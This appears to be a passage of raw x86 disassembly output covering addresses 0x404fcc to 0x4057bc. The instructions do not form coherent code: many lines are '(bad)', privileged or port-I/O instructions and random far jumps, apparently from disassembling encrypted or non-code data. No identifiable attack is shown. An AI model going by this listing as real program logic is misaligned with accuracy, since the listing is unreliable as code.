  404fcc:	sbb    BYTE PTR [edx],bh
  404fce:	jo     0x404fc9
  404fd0:	pushw  0x887
  404fd4:	inc    ebp
  404fd5:	mov    ds:0x56051d99,al
  404fda:	jg     0x404fc9
  404fdc:	stc    
  404fdd:	ins    BYTE PTR es:[edi],dx
  404fde:	ins    BYTE PTR es:[edi],dx
  404fdf:	sti    
  404fe0:	jne    0x405026
  404fe2:	jae    0x404fd4
  404fe4:	les    edx,FWORD PTR [eax+eax*2+0x1]
  404fe8:	mul    ch
  404fea:	or     eax,0x6f136903
  404fef:	inc    eax
  404ff0:	cmp    BYTE PTR [ebp+0xa],dl
  404ff3:	pop    edi
  404ff4:	cld    
  404ff5:	cmp    al,0x18
  404ff7:	mov    ?,WORD PTR [edi-0x2b]
  404ffa:	xchg   ebp,eax
  404ffb:	jmp    0x405002
  404ffd:	jns    0x404fd3
  404fff:	mov    ch,0xcb
  405001:	jge    0x405052
  405003:	es cli 
  405005:	fnstsw WORD PTR [ebx-0x188f7b98]
  40500b:	test   esi,edi
  40500d:	pop    ebp
  40500e:	or     ah,ch
  405010:	xchg   ebx,eax
  405011:	dec    ebp
  405012:	icebp  
  405013:	outs   dx,DWORD PTR ds:[esi]
  405014:	lahf   
  405015:	jnp    0x404fd9
  405017:	jae    0x405008
  405019:	lock (bad) 
  40501b:	inc    ebx
  40501c:	mov    ds:0x5dad3ccd,eax
  405021:	sti    
  405022:	shr    esi,0xac
  405025:	push   es
  405026:	xor    eax,0xa91e0d91
  40502b:	mov    edi,ss
  40502d:	ret    0x255c
  405030:	pop    ds
  405031:	mov    eax,ds:0x4c92cff0
  405036:	lea    ebx,[edx-0xbd5bf58]
  40503c:	jbe    0x4050ae
  40503e:	enter  0x2781,0x4d
  405042:	int    0x28
  405044:	xchg   BYTE PTR [edi+0x78d99824],ch
  40504a:	gs aaa 
  40504c:	lock xor al,0x1e
  40504f:	sub    DWORD PTR [esi-0x613b406a],eax
  405055:	sub    esp,esi
  405057:	jbe    0x4050cb
  405059:	arpl   WORD PTR [edi-0x4e03deab],si
  40505f:	lods   al,BYTE PTR ds:[esi]
  405060:	sub    eax,0x8aa043fd
  405065:	jb     0x4050b4
  405067:	adc    eax,0x38902c68
  40506c:	mov    ds:0x2b7247c5,al
  405071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405072:	cli    
  405073:	(bad)  
  405074:	mov    ds:0x5836a50a,eax
  405079:	fwait
  40507a:	call   0x7229:0xcd56954e
  405081:	pop    es
  405082:	and    al,0x7b
  405084:	in     al,0x9e
  405086:	clc    
  405087:	mov    ecx,0x3a4db255
  40508c:	shl    DWORD PTR [ecx-0x57],1
  40508f:	aaa    
  405090:	inc    edx
  405091:	mov    cl,0x23
  405093:	add    eax,0x64fc3230
  405098:	ret    
  405099:	or     eax,0xa02dd7a4
  40509e:	or     bh,bl
  4050a0:	ffreep st(6)
  4050a2:	xchg   ebp,eax
  4050a3:	push   esp
  4050a4:	js     0x405069
  4050a6:	xchg   edx,eax
  4050a7:	out    0xe8,eax
  4050a9:	mov    ch,0x1e
  4050ab:	stos   BYTE PTR es:[edi],al
  4050ac:	or     esp,esp
  4050ae:	ss arpl WORD PTR fs:[ebp+0x6f],cx
  4050b3:	fwait
  4050b4:	jle    0x40509e
  4050b6:	pop    edi
  4050b7:	imul   esi,esi,0x950074bd
  4050bd:	inc    ecx
  4050be:	mov    ah,0x7a
  4050c0:	mov    esi,DWORD PTR [ecx-0x2a]
  4050c3:	and    eax,0x90a3ee60
  4050c8:	stc    
  4050c9:	or     dl,BYTE PTR [eax+0x3f2f4c84]
  4050cf:	mov    eax,ds:0xac927013
  4050d4:	inc    esp
  4050d5:	fwait
  4050d6:	adc    DWORD PTR [ebp-0x44],edx
  4050d9:	pusha  
  4050da:	inc    esp
  4050db:	test   al,0xa2
  4050dd:	xor    edx,esi
  4050df:	jo     0x40512e
  4050e1:	leave  
  4050e2:	clc    
  4050e3:	(bad)  
  4050e5:	push   edi
  4050e6:	pop    ds
  4050e7:	mov    edx,0x555653e2
  4050ec:	adc    DWORD PTR [esi+0x45013582],ecx
  4050f2:	in     eax,dx
  4050f3:	adc    eax,0x85ba1070
  4050f8:	adc    eax,0x839fa685
  4050fd:	popa   
  4050fe:	icebp  
  4050ff:	neg    edi
  405101:	retf   0x3bf9
  405104:	or     ebx,eax
  405106:	(bad)  
  405107:	and    DWORD PTR [edi-0x10],esi
  40510a:	and    BYTE PTR [edi+0x75],0x82
  40510e:	xchg   ebp,edi
  405110:	sbb    DWORD PTR [esi],esp
  405112:	pushf  
  405113:	daa    
  405114:	or     BYTE PTR [eax-0x10],bh
  405117:	jno    0x405110
  405119:	call   0xbdecca4a
  40511e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40511f:	lods   eax,DWORD PTR ds:[esi]
  405120:	ret    
  405121:	std    
  405122:	jmp    0x283d:0x4d75dcac
  405129:	pop    ebx
  40512a:	xchg   edx,eax
  40512b:	push   esi
  40512c:	inc    ebp
  40512d:	je     0x40516c
  40512f:	jecxz  0x405101
  405131:	cld    
  405132:	leave  
  405133:	out    0x58,al
  405135:	sbb    al,0x98
  405137:	dec    edi
  405138:	xor    al,0x97
  40513a:	inc    ebx
  40513b:	(bad)
  40513e:	retf   
  40513f:	popf   
  405140:	xor    BYTE PTR [edx-0x4],bh
  405143:	repnz jecxz 0x4050ff
  405146:	(bad)  
  405147:	ins    BYTE PTR es:[edi],dx
  405148:	mov    edx,0x1ae457c8
  40514d:	sub    al,0x8e
  40514f:	retf   0xbb73
  405152:	inc    ecx
  405153:	sub    BYTE PTR [edx-0x5c],dl
  405156:	sub    eax,0x3f6897b4
  40515b:	adc    DWORD PTR [ecx+0x34],edx
  40515e:	ret    
  40515f:	push   es
  405160:	es pop es
  405162:	pop    eax
  405163:	jne    0x40511f
  405165:	scas   eax,DWORD PTR es:[edi]
  405166:	or     bh,bl
  405168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405169:	sub    dl,BYTE PTR ds:0x9d7224fe
  40516f:	cmc    
  405170:	scas   eax,DWORD PTR es:[edi]
  405171:	sub    DWORD PTR [ebp+0x136fab9e],0xf7ceba13
  40517b:	in     al,dx
  40517c:	jno    0x405132
  40517e:	cli    
  40517f:	pop    ds
  405180:	adc    BYTE PTR [edx],cl
  405182:	in     al,0x8b
  405184:	in     eax,dx
  405185:	cli    
  405186:	add    DWORD PTR [edi],ebx
  405188:	cmp    al,BYTE PTR fs:[ebx+ebp*8-0x61]
  40518d:	mov    ah,0x3d
  40518f:	xchg   cl,bl
  405191:	add    ecx,esp
  405193:	jmp    0xd9e:0xd0936597
  40519a:	mov    edx,es
  40519c:	arpl   WORD PTR [eax],si
  40519e:	mov    ah,0x0
  4051a0:	icebp  
  4051a1:	in     al,0x4d
  4051a3:	rcr    BYTE PTR [esi+0x999f8b6],1
  4051a9:	sbb    bl,BYTE PTR [edx]
  4051ab:	push   ss
  4051ac:	scas   al,BYTE PTR es:[edi]
  4051ad:	repnz adc eax,0xa36f73b2
  4051b3:	retf   
  4051b4:	jae    0x40517e
  4051b6:	jb     0x405204
  4051b8:	cmp    eax,0x952b580b
  4051be:	loop   0x40517b
  4051c0:	addr16 sbb esi,ecx
  4051c3:	shr    DWORD PTR [edx-0x1e],1
  4051c6:	in     eax,dx
  4051c7:	cmp    al,0xff
  4051c9:	es jge 0x4051e5
  4051cc:	sbb    DWORD PTR [ebp+0x76],ebx
  4051cf:	sbb    al,BYTE PTR [ecx-0x44556498]
  4051d5:	xor    BYTE PTR [ebp-0x500933ed],dl
  4051db:	add    esp,DWORD PTR es:[esi-0x42]
  4051df:	push   esp
  4051e0:	cmp    eax,0xa0527030
  4051e5:	dec    esi
  4051e6:	bound  esi,QWORD PTR [ebp+0x21]
  4051e9:	mov    esi,0x528b1133
  4051ee:	fidiv  WORD PTR [eax+esi*2-0x124265d8]
  4051f5:	dec    esp
  4051f6:	pop    ds
  4051f7:	popf   
  4051f8:	xchg   ah,al
  4051fa:	sbb    BYTE PTR [edi-0x2c],bl
  4051fd:	xchg   ebx,eax
  4051fe:	fimul  DWORD PTR [ebx-0x76]
  405201:	mov    bl,0x1
  405203:	sbb    ebx,DWORD PTR ds:0xadcd2b1d
  405209:	mov    al,ds:0x97f6f7ba
  40520e:	jl     0x4051d2
  405210:	gs in  eax,dx
  405212:	std    
  405213:	adc    BYTE PTR [edx+0x2c5d0a79],0xeb
  40521a:	jl     0x405226
  40521c:	adc    al,0x77
  40521e:	stos   DWORD PTR es:[edi],eax
  40521f:	mov    ds:0xda7d1011,eax
  405224:	(bad)  
  405225:	out    dx,al
  405226:	mul    BYTE PTR [edx-0x32]
  405229:	xor    BYTE PTR [eax],al
  40522b:	dec    ebp
  40522c:	arpl   WORD PTR [eax+0x7f],sp
  40522f:	sbb    eax,0x3bc12b5b
  405234:	call   0x5f193d11
  405239:	js     0x4051e4
  40523b:	repnz mov cs,WORD PTR [eax+0x43f19f20]
  405242:	jg     0x4052bd
  405244:	add    al,0x93
  405246:	das    
  405247:	mov    ebx,0xb05bd60
  40524c:	pushf  
  40524d:	cs xchg ebx,eax
  40524f:	push   cs
  405250:	jle    0x4051e4
  405252:	push   es
  405253:	(bad)  
  405254:	mov    eax,0xb9e57527
  405259:	cmc    
  40525a:	popf   
  40525b:	in     al,0x25
  40525d:	es push ebx
  40525f:	xor    al,0x87
  405261:	daa    
  405262:	dec    esp
  405263:	inc    eax
  405264:	cmp    ebp,DWORD PTR [eax+0x229ba323]
  40526a:	repz jb 0x405259
  40526d:	or     DWORD PTR [ecx-0x52],0xaf9eb650
  405274:	ds popa 
  405276:	(bad)  
  405277:	and    BYTE PTR [ecx],ch
  405279:	push   es
  40527a:	jge    0x4052ad
  40527c:	push   0x7e
  40527e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40527f:	(bad)  
  405280:	mov    al,0x5d
  405282:	leave  
  405283:	mov    edx,0x8853ae72
  405288:	xor    eax,0xb9c4d555
  40528d:	push   eax
  40528e:	in     eax,0xa0
  405290:	mov    dl,0xf2
  405292:	jle    0x405230
  405294:	leave  
  405295:	xor    DWORD PTR [edx+0x6e6904e4],edx
  40529b:	enter  0x3013,0xa
  40529f:	mov    cl,0x39
  4052a1:	xchg   edi,eax
  4052a2:	jg     0x405266
  4052a4:	cmp    cl,BYTE PTR [ecx]
  4052a6:	dec    ecx
  4052a7:	xchg   edx,eax
  4052a8:	dec    eax
  4052a9:	push   0x6f00e30e
  4052ae:	dec    ebx
  4052af:	adc    al,0x69
  4052b1:	xchg   edi,eax
  4052b2:	jmp    0x7514:0xaf982453
  4052b9:	mov    ebp,0x43f16851
  4052be:	mov    esi,ecx
  4052c0:	push   eax
  4052c1:	jmp    0x4052c2
  4052c3:	mov    ebp,0x78fde473
  4052c8:	mov    dh,0x3a
  4052ca:	xchg   ecx,eax
  4052cb:	xchg   edx,esi
  4052cd:	cmp    DWORD PTR [edi+0x5016739e],edi
  4052d3:	cld    
  4052d4:	jb     0x405329
  4052d6:	adc    dh,BYTE PTR [ecx+0x5efe7963]
  4052dc:	mov    eax,ds:0xbcb8de23
  4052e1:	inc    ecx
  4052e2:	mov    ecx,0xb436a358
  4052e7:	and    eax,0x8f0870cc
  4052ec:	rol    BYTE PTR [eax],cl
  4052ee:	jp     0x40529a
  4052f0:	dec    esi
  4052f1:	imul   esp,DWORD PTR [eax],0xffffff87
  4052f4:	fimul  DWORD PTR [edx+0x338676e0]
  4052fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052fb:	and    ch,BYTE PTR [ebp-0x752d47cf]
  405301:	xor    al,0x9e
  405303:	je     0x405318
  405305:	pop    edi
  405306:	jne    0x40536e
  405308:	(bad)  
  405309:	and    al,0xfd
  40530b:	fidivr DWORD PTR gs:[eax-0x4ed29382]
  405312:	lahf   
  405313:	bound  esp,QWORD PTR [eax]
  405315:	retf   0xc764
  405318:	push   ss
  405319:	call   0x3e6d:0xd8f75c97
  405320:	jo     0x40538d
  405322:	popf   
  405323:	dec    esp
  405324:	retf   
  405325:	cli    
  405326:	int3   
  405327:	mov    eax,0x2bf3cbe3
  40532c:	or     edi,DWORD PTR [edx+0x611438c6]
  405332:	not    DWORD PTR [eax+0x2fb1b074]
  405338:	mov    WORD PTR [eax],cs
  40533a:	dec    esi
  40533b:	stos   DWORD PTR es:[edi],eax
  40533c:	ins    BYTE PTR es:[edi],dx
  40533d:	dec    edx
  40533e:	adc    esi,DWORD PTR [ebx+0x23072c78]
  405344:	jg     0x405331
  405346:	xor    al,0x59
  405348:	dec    ebp
  405349:	js     0x4053a0
  40534b:	or     eax,DWORD PTR fs:[esi+0x7e]
  40534f:	add    BYTE PTR [ebp+0x4bd0e56a],dl
  405355:	in     eax,0xf
  405357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405358:	lds    esi,FWORD PTR [esi]
  40535a:	rcr    BYTE PTR [esi],cl
  40535c:	in     al,dx
  40535d:	add    eax,0xaf57ca01
  405362:	fcomp  DWORD PTR [esi-0x5c5483e5]
  405368:	lds    edx,FWORD PTR [ebx]
  40536a:	cmp    al,0xe0
  40536c:	jge    0x40536e
  40536e:	in     eax,0xc9
  405370:	repz mov dl,0x99
  405373:	test   al,0x37
  405375:	inc    ebx
  405376:	fild   DWORD PTR [ebp+0x7d]
  405379:	fisttp WORD PTR [edx-0x13d30d91]
  40537f:	xchg   ebp,esp
  405381:	add    BYTE PTR [ebx+0x5a1aac6c],bh
  405387:	push   edx
  405388:	(bad)  
  405389:	jnp    0x405406
  40538b:	mov    edx,0xc632dbdb
  405390:	cli    
  405391:	mov    esi,0x486c29b7
  405396:	inc    esi
  405397:	(bad)
  40539a:	fsub   st,st(0)
  40539c:	imul   eax,DWORD PTR [esi+0x79],0x239d93b2
  4053a3:	and    DWORD PTR [ebx-0x3cf5ffc6],edi
  4053a9:	or     ebx,edx
  4053ab:	dec    edi
  4053ac:	pop    ds
  4053ad:	cmp    al,0x6
  4053af:	loopne 0x4053d0
  4053b1:	imul   ebp,ebp,0x81de7701
  4053b7:	dec    edi
  4053b8:	dec    ebp
  4053b9:	xlat   BYTE PTR ds:[ebx]
  4053ba:	sub    ebx,DWORD PTR [ebx-0x5f]
  4053bd:	sbb    al,0x7b
  4053bf:	adc    al,0xe3
  4053c1:	jno    0x405391
  4053c3:	mov    ecx,DWORD PTR [edx-0x74]
  4053c6:	fs (bad) 
  4053c8:	popf   
  4053c9:	cmp    al,BYTE PTR [ebx]
  4053cb:	inc    esp
  4053cc:	mov    ecx,0xf10ce5d5
  4053d1:	sbb    DWORD PTR [eax+0x7e],esp
  4053d4:	lock mov dh,0x94
  4053d7:	addr16 sub esp,edx
  4053da:	or     dl,BYTE PTR [edx+0x1812c404]
  4053e0:	jecxz  0x405391
  4053e2:	mov    ecx,DWORD PTR [ecx]
  4053e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053e5:	in     al,dx
  4053e6:	inc    esi
  4053e7:	mov    ?,edx
  4053e9:	cmp    bh,BYTE PTR [edx]
  4053eb:	fadd   QWORD PTR [eax+0x0]
  4053ee:	dec    ecx
  4053ef:	mov    ecx,0x50b4828a
  4053f4:	mov    edi,0x1beea9c7
  4053f9:	cwde   
  4053fa:	jnp    0x405428
  4053fc:	jmp    0x4053ce
  4053fe:	xor    edi,DWORD PTR [edx+edi*1-0x54]
  405402:	mov    ?,WORD PTR [ebx-0x2c]
  405405:	mov    ds,WORD PTR [esi+edx*1-0x5a]
  405409:	push   ecx
  40540a:	mov    al,ds:0x9ad5a733
  40540f:	jp     0x405400
  405411:	pop    edi
  405412:	jae    0x405396
  405414:	shr    DWORD PTR [esi-0x15],0x74
  405418:	leave  
  405419:	and    al,0xae
  40541b:	adc    dl,BYTE PTR ds:0x92357d63
  405421:	and    eax,0xcb91c9c
  405426:	gs push esi
  405428:	mov    esp,0xeef2f58a
  40542d:	xchg   esi,eax
  40542e:	cmp    edx,DWORD PTR [edx+0x6efd8838]
  405434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405435:	out    dx,eax
  405436:	aas    
  405437:	adc    esp,ecx
  405439:	xor    BYTE PTR [edx+eiz*1-0x21d230fd],dh
  405440:	loop   0x4054a3
  405442:	add    al,0x72
  405444:	pop    eax
  405445:	dec    edi
  405446:	mov    ch,0x35
  405448:	lock pop edx
  40544a:	repz leave 
  40544c:	add    bl,ch
  40544e:	pop    esp
  40544f:	push   0x7b
  405451:	adc    bh,cl
  405453:	adc    ch,bl
  405455:	lds    ebp,FWORD PTR [ecx]
  405457:	pusha  
  405458:	pop    ecx
  405459:	(bad)  
  40545a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40545b:	fist   WORD PTR [ebx-0x4d]
  40545e:	out    dx,al
  40545f:	pop    ebx
  405460:	cmp    BYTE PTR [ecx+0x5b],ch
  405463:	cli    
  405464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405465:	(bad)  [eax+eiz*2-0x12290a55]
  40546c:	aaa    
  40546d:	or     DWORD PTR [ebp+0x16a2255f],edx
  405473:	mov    cl,0x4e
  405476:	iret   
  405477:	and    DWORD PTR [ecx+0xe],eax
  40547a:	mov    ebp,0x7af222a1
  40547f:	inc    ecx
  405480:	xor    ebp,DWORD PTR [esi]
  405482:	leave  
  405483:	jmp    0xdb32:0x201bc4f8
  40548a:	xchg   edi,eax
  40548b:	mov    eax,ds:0x1a3e18e8
  405490:	out    dx,eax
  405491:	int    0xa1
  405493:	invd   
  405495:	outs   dx,BYTE PTR ds:[esi]
  405496:	xchg   esi,eax
  405497:	dec    esi
  405498:	xor    ebp,DWORD PTR [eax]
  40549a:	pop    eax
  40549b:	dec    edx
  40549c:	jl     0x405473
  40549e:	sub    BYTE PTR [edi-0x42],0x2c
  4054a2:	(bad)  
  4054a3:	jl     0x4054cb
  4054a5:	(bad)  
  4054a6:	aam    0x1c
  4054a8:	mov    ebp,esi
  4054aa:	jecxz  0x405447
  4054ac:	sub    BYTE PTR [eax+0x7c2cee56],dl
  4054b2:	(bad)  
  4054b3:	sbb    eax,0x13cbe8c0
  4054b8:	jge    0x4054ed
  4054ba:	cmp    BYTE PTR [ebx+0x1d],0x6e
  4054be:	fiadd  DWORD PTR [ecx+esi*8]
  4054c1:	mov    al,0xd6
  4054c3:	inc    edx
  4054c4:	inc    ecx
  4054c5:	pop    ecx
  4054c6:	xor    al,0xee
  4054c8:	sub    eax,0x30ea3697
  4054cd:	mov    dl,al
  4054cf:	clc    
  4054d0:	div    ecx
  4054d2:	jno    0x405514
  4054d4:	addr16 popa 
  4054d6:	loop   0x405535
  4054d8:	jns    0x4054f9
  4054da:	mov    ebx,0xf1ca6415
  4054df:	mov    edi,0xa7e2a178
  4054e4:	xchg   ebp,eax
  4054e5:	es fwait
  4054e7:	into   
  4054e8:	aas    
  4054e9:	es jl  0x4054db
  4054ec:	scas   eax,DWORD PTR es:[edi]
  4054ed:	pop    ss
  4054ee:	push   ebx
  4054ef:	push   cs
  4054f0:	jno    0x405566
  4054f2:	fisub  DWORD PTR [edx]
  4054f4:	fcmovnbe st,st(2)
  4054f6:	ja     0x40556f
  4054f8:	and    BYTE PTR [ebp-0x44],0x4f
  4054fc:	push   0x41186f7e
  405501:	out    dx,al
  405502:	shr    BYTE PTR [ebx],0xa
  405505:	mov    eax,ds:0xb290e126
  40550a:	cmp    BYTE PTR [esi-0x53],bl
  40550d:	retf   0x6cdd
  405510:	dec    edi
  405511:	mov    dh,0xd0
  405513:	(bad)  
  405514:	int    0xc5
  405516:	xchg   ebx,eax
  405517:	sbb    ebx,ebx
  405519:	adc    al,0x71
  40551b:	in     al,dx
  40551c:	fdivr  DWORD PTR ss:[edi]
  40551f:	sub    BYTE PTR [esi],bl
  405521:	rcl    DWORD PTR [ebx],0xcd
  405524:	mov    edi,0x9095edef
  405529:	cmc    
  40552a:	(bad)  
  40552b:	int3   
  40552c:	in     eax,0x9f
  40552e:	pcmpgtb mm7,QWORD PTR [ecx]
  405531:	mov    ebp,0xbebd9805
  405536:	sbb    BYTE PTR [ebx],ch
  405538:	mov    dl,0x12
  40553a:	scas   eax,DWORD PTR es:[edi]
  40553b:	inc    edx
  40553c:	(bad)  
  40553e:	into   
  40553f:	aas    
  405540:	sub    DWORD PTR [ebx],edi
  405542:	mov    DWORD PTR [ebp-0x1e7509c2],eax
  405548:	and    DWORD PTR [esi+ecx*4],edi
  40554b:	xchg   ebp,eax
  40554c:	mov    al,0xff
  40554e:	push   esp
  40554f:	out    0x2,al
  405551:	xor    ch,BYTE PTR [edx+0x7e]
  405554:	push   eax
  405555:	push   ss
  405556:	(bad)  
  405557:	mov    eax,DWORD PTR cs:[edi-0x4c029169]
  40555e:	add    dh,BYTE PTR [eax+ecx*2+0x7c]
  405562:	pop    ebp
  405563:	add    ebp,DWORD PTR [ecx]
  405565:	retf   
  405566:	mov    ds:0xd8e25ab4,al
  40556b:	mov    bh,0x90
  40556d:	bound  esp,QWORD PTR [ecx+0x4c]
  405570:	shl    DWORD PTR [ebp+0x4b],0x49
  405574:	jp     0x4055ca
  405576:	(bad)  
  405577:	push   DWORD PTR [ebx+0x42]
  40557a:	push   ss
  40557b:	cmc    
  40557c:	jns    0x40554c
  40557e:	dec    esp
  40557f:	out    0xc2,eax
  405581:	arpl   WORD PTR ds:0x81617c85,di
  405587:	pop    edi
  405588:	in     al,dx
  405589:	inc    ecx
  40558a:	xchg   ecx,eax
  40558b:	clc    
  40558c:	sub    eax,0x44f78781
  405591:	jmp    0x8217:0xaa836421
  405598:	and    al,0x8f
  40559a:	xor    DWORD PTR [esi+0x6],eax
  40559d:	mov    bl,dl
  40559f:	ror    ah,cl
  4055a1:	inc    ecx
  4055a2:	mov    bl,0xb2
  4055a4:	outs   dx,DWORD PTR ds:[esi]
  4055a5:	ja     0x4055a4
  4055a7:	ins    BYTE PTR es:[edi],dx
  4055a8:	int3   
  4055a9:	fadd   st(3),st
  4055ab:	sbb    al,0xaa
  4055ad:	stc    
  4055ae:	jbe    0x4055af
  4055b0:	ret    0x92f7
  4055b3:	int3   
  4055b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055b5:	fs (bad) 
  4055b7:	out    0xf9,al
  4055b9:	retf   0x5bd4
  4055bc:	mov    bl,0x80
  4055be:	lock dec ecx
  4055c0:	and    eax,DWORD PTR [ebx-0x3e57a6c9]
  4055c6:	jb     0x4055b5
  4055c8:	ret    0xbcf1
  4055cb:	add    DWORD PTR [esp+eiz*2],0xd61dc715
  4055d2:	sbb    ch,BYTE PTR [eax]
  4055d4:	sub    dl,bl
  4055d6:	and    BYTE PTR [eax-0x1e],bh
  4055d9:	pop    esi
  4055da:	jnp    0x40557c
  4055dc:	jp     0x405632
  4055de:	xchg   esi,eax
  4055df:	mov    WORD PTR ds:0x9889c86d,es
  4055e5:	or     DWORD PTR [eax+0x7b],eax
  4055e8:	push   edi
  4055e9:	sub    DWORD PTR [edx+0xb],edi
  4055ec:	adc    eax,0x45942bdd
  4055f2:	dec    edx
  4055f3:	sub    al,0xfa
  4055f5:	and    ch,dh
  4055f7:	repnz shl ecx,0x13
  4055fb:	xor    DWORD PTR [ecx+0x66b90725],eax
  405601:	pop    esi
  405602:	les    ebp,FWORD PTR cs:[eax+0x5e95cabd]
  405609:	mov    ah,0xf5
  40560b:	call   0xcfbd23df
  405610:	mov    ss,WORD PTR [eax]
  405612:	jmp    0xfc9b0089
  405617:	stos   DWORD PTR es:[edi],eax
  405618:	xor    eax,0x7d0c9d59
  40561d:	xchg   ebp,eax
  40561e:	push   es
  40561f:	mov    cl,BYTE PTR [eax]
  405621:	jb     0x4055d1
  405623:	(bad)  
  405624:	ror    esp,cl
  405626:	push   cs
  405627:	(bad)  [ebp-0x1c855fd4]
  40562d:	pop    ebp
  40562e:	mov    ebp,0x839e3ac6
  405633:	sbb    eax,0xaa1c073f
  405638:	daa    
  405639:	jmp    0x89a9:0xc8bc2116
  405640:	cmp    edx,DWORD PTR [ecx]
  405642:	cld    
  405643:	in     al,0x60
  405645:	pextrw ecx,mm1,0x83
  405649:	hlt    
  40564a:	sub    cl,al
  40564c:	xor    cl,BYTE PTR [ebx]
  40564e:	fld    st(2)
  405650:	lds    edx,FWORD PTR [ecx]
  405652:	mov    ebx,0xe18c2789
  405657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405658:	mov    edi,DWORD PTR [eax]
  40565a:	push   esi
  40565b:	(bad)  
  40565d:	xor    eax,0x72f58d7f
  405662:	inc    esi
  405663:	adc    edi,esi
  405665:	mov    ebx,DWORD PTR [ecx+0x6066a823]
  40566b:	mov    ecx,0xb91d51a1
  405670:	ror    dl,0xc6
  405673:	mov    eax,0xba083f0c
  405678:	jecxz  0x405664
  40567a:	es jecxz 0x40561d
  40567d:	(bad)  
  40567e:	bound  edi,QWORD PTR [edi-0x31]
  405681:	cdq    
  405682:	stc    
  405683:	push   ebp
  405684:	out    0x52,al
  405686:	dec    esi
  405687:	pusha  
  405688:	add    al,0x32
  40568a:	test   ebx,ebp
  40568c:	adc    ebx,eax
  40568e:	test   ch,ah
  405690:	pop    esi
  405691:	mov    bh,0x11
  405693:	jnp    0x40563b
  405695:	push   edi
  405696:	inc    BYTE PTR [edi+0x24ad028a]
  40569c:	imul   ecx,DWORD PTR [edi-0x26],0x27da632f
  4056a3:	rcr    DWORD PTR [eax+edi*1],0xa0
  4056a7:	lods   al,BYTE PTR ds:[esi]
  4056a8:	repz rcl DWORD PTR [ebx+0x39],0x11
  4056ad:	dec    ebp
  4056ae:	jne    0x4056ac
  4056b0:	jnp    0x405692
  4056b2:	popa   
  4056b3:	sbb    eax,0x8c5e169c
  4056b8:	gs lahf 
  4056ba:	inc    edx
  4056bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bc:	xor    eax,0xfea5785b
  4056c1:	cs ret 0x8575
  4056c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c6:	cld    
  4056c7:	test   DWORD PTR [ebp+0x5bf346b8],ecx
  4056cd:	js     0x40570c
  4056cf:	dec    eax
  4056d0:	repz cwde 
  4056d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d3:	sti    
  4056d4:	mov    esp,0x23a02a95
  4056d9:	pop    esp
  4056da:	pop    ds
  4056db:	mov    ebp,0x3276a7bd
  4056e0:	jmp    0xab1ef757
  4056e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056e6:	mov    al,ds:0x7d8bc13b
  4056eb:	and    eax,0x3c20f54
  4056f0:	pop    esp
  4056f1:	in     eax,dx
  4056f2:	in     eax,0xee
  4056f4:	into   
  4056f5:	xor    al,0xa
  4056f7:	inc    ebx
  4056f8:	push   ecx
  4056f9:	repnz mov fs,WORD PTR [eax]
  4056fc:	loope  0x4056d4
  4056fe:	loope  0x40573f
  405700:	inc    esi
  405701:	jecxz  0x40570a
  405703:	dec    ebx
  405704:	(bad)  
  405705:	ins    BYTE PTR es:[edi],dx
  405706:	(bad)  
  40570a:	and    DWORD PTR ds:0x220e6f04,ebx
  405710:	stos   BYTE PTR es:[edi],al
  405711:	out    dx,eax
  405712:	cli    
  405713:	and    DWORD PTR [eax-0x1656120e],0x30
  40571a:	sub    cl,bl
  40571c:	lods   eax,DWORD PTR cs:[esi]
  40571e:	or     ah,BYTE PTR [esi]
  405720:	test   DWORD PTR [edx+0x41],edi
  405723:	ja     0x405717
  405725:	repz pop esp
  405727:	test   eax,0xbec6ea58
  40572c:	pop    ebp
  40572d:	xor    DWORD PTR [ebx*4-0x1b213b2f],esi
  405734:	je     0x405722
  405736:	mov    edx,0x667b7aa2
  40573b:	cmp    BYTE PTR [ebx+0x755f948c],ah
  405741:	pop    esp
  405742:	and    edi,DWORD PTR [eax-0x66]
  405745:	fs sbb esi,edi
  405748:	fcmovnbe st,st(3)
  40574a:	mov    dl,0xc5
  40574c:	(bad)  
  40574d:	gs jp  0x4056e6
  405750:	mov    esp,DWORD PTR [edi+esi*4]
  405753:	adc    eax,0x5eabe45c
  405758:	js     0x40572c
  40575a:	lock push esi
  40575c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40575d:	sub    bl,BYTE PTR [ebx]
  40575f:	mov    DWORD PTR [esp+eax*4],esp
  405762:	sahf   
  405763:	leave  
  405764:	imul   ebp,DWORD PTR [eax-0x29886f12],0x4f
  40576b:	mov    ds:0xcc35cbc3,eax
  405770:	mov    ds,ebp
  405772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405773:	pop    ds
  405774:	push   0xdecea048
  405779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40577a:	div    bh
  40577c:	mov    esi,0x236c0139
  405781:	and    dh,ah
  405783:	cli    
  405784:	in     al,0xbc
  405786:	test   eax,0x426010b0
  40578b:	sub    bl,dh
  40578d:	arpl   WORD PTR [edx],dx
  40578f:	das    
  405790:	push   0x7f
  405792:	mov    esi,0xb4b807f6
  405797:	sbb    al,0x67
  405799:	or     dh,dl
  40579b:	or     eax,0x68732733
  4057a0:	ins    BYTE PTR es:[edi],dx
  4057a1:	adc    BYTE PTR [ebx-0x32],ah
  4057a4:	cld    
  4057a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057a6:	or     edi,edi
  4057a8:	jmp    0xd35b:0x470d2d51
  4057af:	add    ah,BYTE PTR [eax]
  4057b1:	mov    al,0xcc
  4057b3:	mov    ds:0xfcf3fb7a,al
  4057b8:	lock into 
  4057ba:	and    ebx,DWORD PTR [eax]
  4057bc:	addr16 ja 0x4057d1
